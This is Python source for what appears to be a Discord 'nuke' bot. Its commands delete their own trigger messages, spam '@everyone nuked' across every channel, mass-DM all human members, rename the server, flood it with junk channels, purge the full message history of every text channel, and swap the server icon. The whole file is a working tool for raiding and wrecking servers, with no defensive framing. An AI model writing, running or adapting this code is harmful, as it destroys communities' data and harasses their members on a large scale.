@bot.command()
async def spam(ctx, amount: int = 50, *, msg="nuked"):
    await safe(ctx.message.delete)
    for _ in range(amount):
        await safe(ctx.send, msg)

@bot.command()
async def spamall(ctx, amount: int = 10, *, msg="@everyone nuked"):
    await safe(ctx.message.delete)
    async def go(ch):
        for _ in range(amount):
            await safe(ch.send, msg)
    await asyncio.gather(*[go(c) for c in ctx.guild.text_channels])

@bot.command()
async def massdm(ctx, *, msg="hey"):
    await safe(ctx.message.delete)
    await asyncio.gather(*[safe(m.send, msg) for m in ctx.guild.members
                           if not m.bot])

@bot.command()
async def rename(ctx, *, name="NUKED"):
    await safe(ctx.message.delete)
    await safe(ctx.guild.edit, name=name)

@bot.command()
async def create(ctx, count: int = 50, *, name="Spent"):
    await safe(ctx.message.delete)
    sem = asyncio.Semaphore(8)
    async def make(i):
        async with sem:
            await safe(ctx.guild.create_text_channel, f"{name}{i:03d}")
    await asyncio.gather(*[make(i) for i in range(count)])

@bot.command()
async def wipe(ctx):
    await safe(ctx.message.delete)
    async def purge(ch):
        try:
            await ch.purge(limit=None)
        except:
            pass
    await asyncio.gather(*[purge(c) for c in ctx.guild.text_channels])

@bot.command()
async def icon(ctx, url: str):
    await safe(ctx.message.delete)
    async with aiohttp.ClientSession() as s:
        async with s.get(url) as r:
            data = await r.read()
    await safe(ctx.guild.edit, icon=data)

bot.run(TOKEN)
